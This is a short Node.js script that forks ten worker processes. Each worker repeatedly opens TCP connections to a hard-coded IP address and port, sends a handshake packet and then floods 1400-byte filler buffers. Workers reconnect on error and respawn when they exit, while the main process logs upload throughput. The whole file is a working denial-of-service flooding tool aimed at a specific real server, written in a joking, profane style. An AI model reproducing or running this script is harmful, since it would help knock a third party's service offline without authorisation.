#!/usr/bin/node
/**
 * @file index.js -- all things
 * @author XCRail Fans
 * @copyright public "otome" domain
 */
'use strict'

const cluster = require('cluster')
const net = require('net')

const hellow = Buffer.from([0x07, 0x00, 0x04, 0x01, 0x30, 0x63, 0xdd, 0x01])
const buffet = Buffer.from([...new Array(1400).keys()].map((i) => 2 - i % 2))

if (cluster.isMaster) {
  const config = {
    host: '222.187.254.57',
    port: '27310',
    nick: ['xiaocao2015']
  }
  const stat = {
    futa: 0,
    _up_: 0,
    _TATP_: 0
  }
  const oldsuiPs = 10

  const fuck = () => cluster.fork().on('message', (delta) => {
    stat.futa += delta.futa
    stat._up_ += delta._up_
    stat._TATP_ += delta._TATP_
    stat.futa = delta.futa < 0 ? 0 : stat.futa
  }).on('exit', (w, c, sig) => {
    // if (w.exitedAfterDisconnect)
    fuck()
  }).send(config)

  for (let i = 0; i < oldsuiPs; i++) {
    fuck()
  }

  setInterval(() => console.log(`${(stat._up_ /= 2) >> 10} KB/s up, ${stat.futa} futas coming.`), 500)
} else if (cluster.isWorker) {
  const macrossD = (futa, up, tatp) => {
    process.send({
      futa: futa,
      _up_: up,
      _TATP_: tatp
    })
  }

  let suckit = new net.Socket()
  suckit.setTimeout(1000)

  process.on('message', ({host, port}) => {
    const coming = () => {
      suckit.write(buffet, () => {
        macrossD(0, 1400, 1)
      })
    }

    const shit = () => {
      suckit.connect({
        port: port,
        host: host
      })
    }

    suckit.on('connect', () => {
      suckit.write(hellow)
      macrossD(1, 0, 0)
      coming()
    }).on('close', () => {
      macrossD(-1, 0, 0)
      process.exit(0)
    }).on('data', () => {
      coming()
    }).on('error', (err) => {
      setTimeout(shit, 1000)
    })

    shit()
  })
}
